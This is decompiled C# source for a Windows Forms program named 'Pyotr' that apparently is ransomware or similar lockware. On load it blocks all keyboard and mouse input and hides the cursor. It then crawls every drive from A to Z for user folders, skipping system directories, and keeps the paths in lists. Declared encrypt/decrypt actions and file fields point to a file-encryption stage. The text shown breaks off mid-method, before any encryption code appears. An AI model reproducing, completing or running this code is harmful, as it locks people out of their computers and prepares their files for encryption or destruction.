using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Pyotr.My;

namespace Pyotr;

[DesignerGenerated]
public class Form1 : Form
{
	public enum CryptoAction
	{
		ActionEncrypt = 1,
		ActionDecrypt
	}

	private string filenamez;

	private string strFileToEncrypt;

	private string strFileToDecrypt;

	private string strOutputEncrypt;

	private string strOutputDecrypt;

	private FileStream fsInput;

	private FileStream fsOutput;

	private IContainer components;

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer8
	{
		[CompilerGenerated]
		get
		{
			return _Timer8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer8_Tick;
			Timer timer = _Timer8;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer8 = value;
			timer = _Timer8;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer7
	{
		[CompilerGenerated]
		get
		{
			return _Timer7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer7_Tick;
			Timer timer = _Timer7;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer7 = value;
			timer = _Timer7;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer6
	{
		[CompilerGenerated]
		get
		{
			return _Timer6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer6_Tick;
			Timer timer = _Timer6;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer6 = value;
			timer = _Timer6;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer5
	{
		[CompilerGenerated]
		get
		{
			return _Timer5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer5_Tick;
			Timer timer = _Timer5;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer5 = value;
			timer = _Timer5;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer4
	{
		[CompilerGenerated]
		get
		{
			return _Timer4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer4_Tick;
			Timer timer = _Timer4;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer4 = value;
			timer = _Timer4;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer3
	{
		[CompilerGenerated]
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			Timer timer = _Timer3;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			timer = _Timer3;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[CompilerGenerated]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			Timer timer = _Timer2;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			timer = _Timer2;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar10")]
	internal virtual ProgressBar ProgressBar10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar9")]
	internal virtual ProgressBar ProgressBar9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar8")]
	internal virtual ProgressBar ProgressBar8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar7")]
	internal virtual ProgressBar ProgressBar7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar6")]
	internal virtual ProgressBar ProgressBar6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar5")]
	internal virtual ProgressBar ProgressBar5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar4")]
	internal virtual ProgressBar ProgressBar4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar3")]
	internal virtual ProgressBar ProgressBar3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar2")]
	internal virtual ProgressBar ProgressBar2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar1")]
	internal virtual ProgressBar ProgressBar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox9")]
	internal virtual ListBox ListBox9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox8")]
	internal virtual ListBox ListBox8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox7")]
	internal virtual ListBox ListBox7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox6")]
	internal virtual ListBox ListBox6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox5")]
	internal virtual ListBox ListBox5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox4")]
	internal virtual ListBox ListBox4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox3")]
	internal virtual ListBox ListBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox2")]
	internal virtual ListBox ListBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox1")]
	internal virtual ListBox ListBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form1()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		((Control)this).add_KeyDown(new KeyEventHandler(Form1_KeyDown));
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int BlockInput(int fBlock);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int ShowCursor(int lShow);

	private void Form1_KeyDown(object sender, KeyEventArgs e)
	{
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		BlockInput(1);
		ShowCursor(0);
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("A:\\"))
			{
				if (!directory.EndsWith("Bin") && !directory.EndsWith("indows") && !directory.EndsWith("tings") && !directory.EndsWith("System Volume Information") && !directory.EndsWith("cache") && !directory.EndsWith("very") && !directory.EndsWith("rogram Files (x86)") && !directory.EndsWith("rogram Files") && !directory.EndsWith("boot") && !directory.EndsWith("efi") && !directory.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory);
					ListBox9.get_Items().Add((object)directory);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("B:\\"))
			{
				if (!directory2.EndsWith("Bin") && !directory2.EndsWith("indows") && !directory2.EndsWith("tings") && !directory2.EndsWith("System Volume Information") && !directory2.EndsWith("cache") && !directory2.EndsWith("very") && !directory2.EndsWith("rogram Files (x86)") && !directory2.EndsWith("rogram Files") && !directory2.EndsWith("boot") && !directory2.EndsWith("efi") && !directory2.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory2);
					ListBox9.get_Items().Add((object)directory2);
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory3 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\"))
			{
				if (!directory3.EndsWith("Bin") && !directory3.EndsWith("indows") && !directory3.EndsWith("tings") && !directory3.EndsWith("System Volume Information") && !directory3.EndsWith("cache") && !directory3.EndsWith("very") && !directory3.EndsWith("rogram Files (x86)") && !directory3.EndsWith("rogram Files") && !directory3.EndsWith("boot") && !directory3.EndsWith("efi") && !directory3.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory3);
					ListBox9.get_Items().Add((object)directory3);
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory4 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("D:\\"))
			{
				if (!directory4.EndsWith("Bin") && !directory4.EndsWith("indows") && !directory4.EndsWith("tings") && !directory4.EndsWith("System Volume Information") && !directory4.EndsWith("cache") && !directory4.EndsWith("very") && !directory4.EndsWith("rogram Files (x86)") && !directory4.EndsWith("rogram Files") && !directory4.EndsWith("boot") && !directory4.EndsWith("efi") && !directory4.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory4);
					ListBox9.get_Items().Add((object)directory4);
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory5 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("E:\\"))
			{
				if (!directory5.EndsWith("Bin") && !directory5.EndsWith("indows") && !directory5.EndsWith("tings") && !directory5.EndsWith("System Volume Information") && !directory5.EndsWith("cache") && !directory5.EndsWith("very") && !directory5.EndsWith("rogram Files (x86)") && !directory5.EndsWith("rogram Files") && !directory5.EndsWith("boot") && !directory5.EndsWith("efi") && !directory5.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory5);
					ListBox9.get_Items().Add((object)directory5);
				}
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory6 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("F:\\"))
			{
				if (!directory6.EndsWith("Bin") && !directory6.EndsWith("indows") && !directory6.EndsWith("tings") && !directory6.EndsWith("System Volume Information") && !directory6.EndsWith("cache") && !directory6.EndsWith("very") && !directory6.EndsWith("rogram Files (x86)") && !directory6.EndsWith("rogram Files") && !directory6.EndsWith("boot") && !directory6.EndsWith("efi") && !directory6.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory6);
					ListBox9.get_Items().Add((object)directory6);
				}
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory7 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("G:\\"))
			{
				if (!directory7.EndsWith("Bin") && !directory7.EndsWith("indows") && !directory7.EndsWith("tings") && !directory7.EndsWith("System Volume Information") && !directory7.EndsWith("cache") && !directory7.EndsWith("very") && !directory7.EndsWith("rogram Files (x86)") && !directory7.EndsWith("rogram Files") && !directory7.EndsWith("boot") && !directory7.EndsWith("efi") && !directory7.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory7);
					ListBox9.get_Items().Add((object)directory7);
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory8 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("H:\\"))
			{
				if (!directory8.EndsWith("Bin") && !directory8.EndsWith("indows") && !directory8.EndsWith("tings") && !directory8.EndsWith("System Volume Information") && !directory8.EndsWith("cache") && !directory8.EndsWith("very") && !directory8.EndsWith("rogram Files (x86)") && !directory8.EndsWith("rogram Files") && !directory8.EndsWith("boot") && !directory8.EndsWith("efi") && !directory8.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory8);
					ListBox9.get_Items().Add((object)directory8);
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory9 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("I:\\"))
			{
				if (!directory9.EndsWith("Bin") && !directory9.EndsWith("indows") && !directory9.EndsWith("tings") && !directory9.EndsWith("System Volume Information") && !directory9.EndsWith("cache") && !directory9.EndsWith("very") && !directory9.EndsWith("rogram Files (x86)") && !directory9.EndsWith("rogram Files") && !directory9.EndsWith("boot") && !directory9.EndsWith("efi") && !directory9.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory9);
					ListBox9.get_Items().Add((object)directory9);
				}
			}
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory10 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("J:\\"))
			{
				if (!directory10.EndsWith("Bin") && !directory10.EndsWith("indows") && !directory10.EndsWith("tings") && !directory10.EndsWith("System Volume Information") && !directory10.EndsWith("cache") && !directory10.EndsWith("very") && !directory10.EndsWith("rogram Files (x86)") && !directory10.EndsWith("rogram Files") && !directory10.EndsWith("boot") && !directory10.EndsWith("efi") && !directory10.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory10);
					ListBox9.get_Items().Add((object)directory10);
				}
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory11 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("K:\\"))
			{
				if (!directory11.EndsWith("Bin") && !directory11.EndsWith("indows") && !directory11.EndsWith("tings") && !directory11.EndsWith("System Volume Information") && !directory11.EndsWith("cache") && !directory11.EndsWith("very") && !directory11.EndsWith("rogram Files (x86)") && !directory11.EndsWith("rogram Files") && !directory11.EndsWith("boot") && !directory11.EndsWith("efi") && !directory11.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory11);
					ListBox9.get_Items().Add((object)directory11);
				}
			}
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory12 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("L:\\"))
			{
				if (!directory12.EndsWith("Bin") && !directory12.EndsWith("indows") && !directory12.EndsWith("tings") && !directory12.EndsWith("System Volume Information") && !directory12.EndsWith("cache") && !directory12.EndsWith("very") && !directory12.EndsWith("rogram Files (x86)") && !directory12.EndsWith("rogram Files") && !directory12.EndsWith("boot") && !directory12.EndsWith("efi") && !directory12.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory12);
					ListBox9.get_Items().Add((object)directory12);
				}
			}
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory13 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("M:\\"))
			{
				if (!directory13.EndsWith("Bin") && !directory13.EndsWith("indows") && !directory13.EndsWith("tings") && !directory13.EndsWith("System Volume Information") && !directory13.EndsWith("cache") && !directory13.EndsWith("very") && !directory13.EndsWith("rogram Files (x86)") && !directory13.EndsWith("rogram Files") && !directory13.EndsWith("boot") && !directory13.EndsWith("efi") && !directory13.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory13);
					ListBox9.get_Items().Add((object)directory13);
				}
			}
		}
		catch (Exception projectError13)
		{
			ProjectData.SetProjectError(projectError13);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory14 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("N:\\"))
			{
				if (!directory14.EndsWith("Bin") && !directory14.EndsWith("indows") && !directory14.EndsWith("tings") && !directory14.EndsWith("System Volume Information") && !directory14.EndsWith("cache") && !directory14.EndsWith("very") && !directory14.EndsWith("rogram Files (x86)") && !directory14.EndsWith("rogram Files") && !directory14.EndsWith("boot") && !directory14.EndsWith("efi") && !directory14.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory14);
					ListBox9.get_Items().Add((object)directory14);
				}
			}
		}
		catch (Exception projectError14)
		{
			ProjectData.SetProjectError(projectError14);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory15 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("O:\\"))
			{
				if (!directory15.EndsWith("Bin") && !directory15.EndsWith("indows") && !directory15.EndsWith("tings") && !directory15.EndsWith("System Volume Information") && !directory15.EndsWith("cache") && !directory15.EndsWith("very") && !directory15.EndsWith("rogram Files (x86)") && !directory15.EndsWith("rogram Files") && !directory15.EndsWith("boot") && !directory15.EndsWith("efi") && !directory15.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory15);
					ListBox9.get_Items().Add((object)directory15);
				}
			}
		}
		catch (Exception projectError15)
		{
			ProjectData.SetProjectError(projectError15);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory16 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("P:\\"))
			{
				if (!directory16.EndsWith("Bin") && !directory16.EndsWith("indows") && !directory16.EndsWith("tings") && !directory16.EndsWith("System Volume Information") && !directory16.EndsWith("cache") && !directory16.EndsWith("very") && !directory16.EndsWith("rogram Files (x86)") && !directory16.EndsWith("rogram Files") && !directory16.EndsWith("boot") && !directory16.EndsWith("efi") && !directory16.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory16);
					ListBox9.get_Items().Add((object)directory16);
				}
			}
		}
		catch (Exception projectError16)
		{
			ProjectData.SetProjectError(projectError16);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory17 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("Q:\\"))
			{
				if (!directory17.EndsWith("Bin") && !directory17.EndsWith("indows") && !directory17.EndsWith("tings") && !directory17.EndsWith("System Volume Information") && !directory17.EndsWith("cache") && !directory17.EndsWith("very") && !directory17.EndsWith("rogram Files (x86)") && !directory17.EndsWith("rogram Files") && !directory17.EndsWith("boot") && !directory17.EndsWith("efi") && !directory17.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory17);
					ListBox9.get_Items().Add((object)directory17);
				}
			}
		}
		catch (Exception projectError17)
		{
			ProjectData.SetProjectError(projectError17);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory18 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("R:\\"))
			{
				if (!directory18.EndsWith("Bin") && !directory18.EndsWith("indows") && !directory18.EndsWith("tings") && !directory18.EndsWith("System Volume Information") && !directory18.EndsWith("cache") && !directory18.EndsWith("very") && !directory18.EndsWith("rogram Files (x86)") && !directory18.EndsWith("rogram Files") && !directory18.EndsWith("boot") && !directory18.EndsWith("efi") && !directory18.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory18);
					ListBox9.get_Items().Add((object)directory18);
				}
			}
		}
		catch (Exception projectError18)
		{
			ProjectData.SetProjectError(projectError18);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory19 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("S:\\"))
			{
				if (!directory19.EndsWith("Bin") && !directory19.EndsWith("indows") && !directory19.EndsWith("tings") && !directory19.EndsWith("System Volume Information") && !directory19.EndsWith("cache") && !directory19.EndsWith("very") && !directory19.EndsWith("rogram Files (x86)") && !directory19.EndsWith("rogram Files") && !directory19.EndsWith("boot") && !directory19.EndsWith("efi") && !directory19.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory19);
					ListBox9.get_Items().Add((object)directory19);
				}
			}
		}
		catch (Exception projectError19)
		{
			ProjectData.SetProjectError(projectError19);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory20 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("T:\\"))
			{
				if (!directory20.EndsWith("Bin") && !directory20.EndsWith("indows") && !directory20.EndsWith("tings") && !directory20.EndsWith("System Volume Information") && !directory20.EndsWith("cache") && !directory20.EndsWith("very") && !directory20.EndsWith("rogram Files (x86)") && !directory20.EndsWith("rogram Files") && !directory20.EndsWith("boot") && !directory20.EndsWith("efi") && !directory20.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory20);
					ListBox9.get_Items().Add((object)directory20);
				}
			}
		}
		catch (Exception projectError20)
		{
			ProjectData.SetProjectError(projectError20);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory21 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("U:\\"))
			{
				if (!directory21.EndsWith("Bin") && !directory21.EndsWith("indows") && !directory21.EndsWith("tings") && !directory21.EndsWith("System Volume Information") && !directory21.EndsWith("cache") && !directory21.EndsWith("very") && !directory21.EndsWith("rogram Files (x86)") && !directory21.EndsWith("rogram Files") && !directory21.EndsWith("boot") && !directory21.EndsWith("efi") && !directory21.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory21);
					ListBox9.get_Items().Add((object)directory21);
				}
			}
		}
		catch (Exception projectError21)
		{
			ProjectData.SetProjectError(projectError21);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory22 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("V:\\"))
			{
				if (!directory22.EndsWith("Bin") && !directory22.EndsWith("indows") && !directory22.EndsWith("tings") && !directory22.EndsWith("System Volume Information") && !directory22.EndsWith("cache") && !directory22.EndsWith("very") && !directory22.EndsWith("rogram Files (x86)") && !directory22.EndsWith("rogram Files") && !directory22.EndsWith("boot") && !directory22.EndsWith("efi") && !directory22.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory22);
					ListBox9.get_Items().Add((object)directory22);
				}
			}
		}
		catch (Exception projectError22)
		{
			ProjectData.SetProjectError(projectError22);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory23 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("W:\\"))
			{
				if (!directory23.EndsWith("Bin") && !directory23.EndsWith("indows") && !directory23.EndsWith("tings") && !directory23.EndsWith("System Volume Information") && !directory23.EndsWith("cache") && !directory23.EndsWith("very") && !directory23.EndsWith("rogram Files (x86)") && !directory23.EndsWith("rogram Files") && !directory23.EndsWith("boot") && !directory23.EndsWith("efi") && !directory23.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory23);
					ListBox9.get_Items().Add((object)directory23);
				}
			}
		}
		catch (Exception projectError23)
		{
			ProjectData.SetProjectError(projectError23);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory24 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("X:\\"))
			{
				if (!directory24.EndsWith("Bin") && !directory24.EndsWith("indows") && !directory24.EndsWith("tings") && !directory24.EndsWith("System Volume Information") && !directory24.EndsWith("cache") && !directory24.EndsWith("very") && !directory24.EndsWith("rogram Files (x86)") && !directory24.EndsWith("rogram Files") && !directory24.EndsWith("boot") && !directory24.EndsWith("efi") && !directory24.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory24);
					ListBox9.get_Items().Add((object)directory24);
				}
			}
		}
		catch (Exception projectError24)
		{
			ProjectData.SetProjectError(projectError24);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory25 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("Y:\\"))
			{
				if (!directory25.EndsWith("Bin") && !directory25.EndsWith("indows") && !directory25.EndsWith("tings") && !directory25.EndsWith("System Volume Information") && !directory25.EndsWith("cache") && !directory25.EndsWith("very") && !directory25.EndsWith("rogram Files (x86)") && !directory25.EndsWith("rogram Files") && !directory25.EndsWith("boot") && !directory25.EndsWith("efi") && !directory25.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory25);
					ListBox9.get_Items().Add((object)directory25);
				}
			}
		}
		catch (Exception projectError25)
		{
			ProjectData.SetProjectError(projectError25);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory26 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("Z:\\"))
			{
				if (!directory26.EndsWith("Bin") && !directory26.EndsWith("indows") && !directory26.EndsWith("tings") && !directory26.EndsWith("System Volume Information") && !directory26.EndsWith("cache") && !directory26.EndsWith("very") && !directory26.EndsWith("rogram Files (x86)") && !directory26.EndsWith("rogram Files") && !directory26.EndsWith("boot") && !directory26.EndsWith("efi") && !directory26.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory26);
					ListBox9.get_Items().Add((object)directory26);
				}
			}
		}
		catch (Exception projectError26)
		{
			ProjectData.SetProjectError(projectError26);
			ProjectData.ClearProjectError();
		}
		Timer1.Start();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		ProgressBar1.set_Maximum(ListBox1.get_Items().get_Count());
		if (ProgressBar1.get_Value() == ListBox1.get_Items().get_Count())
		{
			Timer1.Stop();
			Timer2.Start();
			return;
		}
		ListBox1.set_SelectedIndex(ProgressBar1.get_Value());
		ListBox1.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox1.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox2.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar1.Increment(1);
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		ProgressBar2.set_Maximum(ListBox2.get_Items().get_Count());
		if (ProgressBar2.get_Value() == ListBox2.get_Items().get_Count())
		{
			Timer2.Stop();
			Timer3.Start();
			return;
		}
		ListBox2.set_SelectedIndex(ProgressBar2.get_Value());
		ListBox2.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox2.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox3.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar2.Increment(1);
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		ProgressBar3.set_Maximum(ListBox3.get_Items().get_Count());
		if (ProgressBar3.get_Value() == ListBox3.get_Items().get_Count())
		{
			Timer3.Stop();
			Timer4.Start();
			return;
		}
		ListBox3.set_SelectedIndex(ProgressBar3.get_Value());
		ListBox3.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox3.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox4.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar3.Increment(1);
	}

	private void Timer4_Tick(object sender, EventArgs e)
	{
		ProgressBar4.set_Maximum(ListBox4.get_Items().get_Count());
		if (ProgressBar4.get_Value() == ListBox4.get_Items().get_Count())
		{
			Timer4.Stop();
			Timer5.Start();
			return;
		}
		ListBox4.set_SelectedIndex(ProgressBar4.get_Value());
		ListBox4.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox4.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox5.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar4.Increment(1);
	}

	private void Timer5_Tick(object sender, EventArgs e)
	{
